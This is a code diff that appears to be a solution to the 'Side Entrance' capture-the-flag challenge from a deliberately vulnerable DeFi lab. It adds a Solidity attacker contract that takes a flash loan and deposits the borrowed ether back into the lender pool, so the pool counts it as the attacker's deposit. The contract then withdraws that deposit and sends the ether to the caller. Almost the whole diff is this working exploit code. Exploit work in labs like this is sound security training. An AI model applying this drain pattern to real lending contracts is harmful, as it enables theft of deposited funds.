@@ -9,7 +9,29 @@ interface IFlashLoanEtherReceiver {
 }
 
 contract SideEntranceFlashLoanEtherReceiver is IFlashLoanEtherReceiver {
+    address target;
 
+    constructor(address _target){
+        target = _target;
+    }
+
+    function startLoan(uint256 amount) external {
+        SideEntranceLenderPool(target).flashLoan(amount);
+    }
+
+    function execute() external payable{
+        SideEntranceLenderPool(target).deposit{value: msg.value}();
+    }
+
+    function attack(uint256 amount) external {
+        SideEntranceLenderPool(target).withdraw();
+        (bool success, ) = payable(msg.sender).call{value: amount}("");
+        require(success, "transfer failed");
+    }
+
+    receive() external payable {
+        
+    }
 }
 
 /**
@@ -41,6 +63,8 @@ contract SideEntranceLenderPool {
     }
 
     function flashLoan(uint256 amount) external {
+
+        uint256 balanceBefore = address(this).balance;
  
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
 
